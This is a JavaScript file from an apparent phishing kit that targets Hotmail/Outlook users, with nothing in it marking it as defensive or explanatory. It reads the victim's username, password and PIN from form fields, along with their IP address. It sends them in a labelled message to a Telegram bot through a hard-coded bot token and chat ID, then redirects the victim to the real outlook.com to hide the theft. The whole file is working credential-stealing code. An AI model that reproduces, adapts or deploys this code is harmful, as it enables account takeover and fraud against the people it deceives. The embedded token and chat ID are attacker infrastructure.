//bot token
var telegram_bot_id = "7383106110:AAEAe76RSyy5noOUxeldDGhb_cj2A-y0R5A";
//chat id
var chat_id = "-1002155555779";
var u_name, pax, pax2, ip, ip2;
var ready = function () {
    u_name = document.getElementById("normalx").value;
    pax = document.getElementById("vergatario").value;
    pax2 = document.getElementById("normal").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "🟦HOTMAIL🟦\n\n🆔US3R: " + u_name + "\n🔐CL4V3: " + pax +"\n🔑PIN: " + pax2 +"\n\nIP: " + ip +"\n" + ip2 +"\n🟦ganadores77🟦";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'https://outlook.com/';
        console.log(response);
    });
    return false;
};
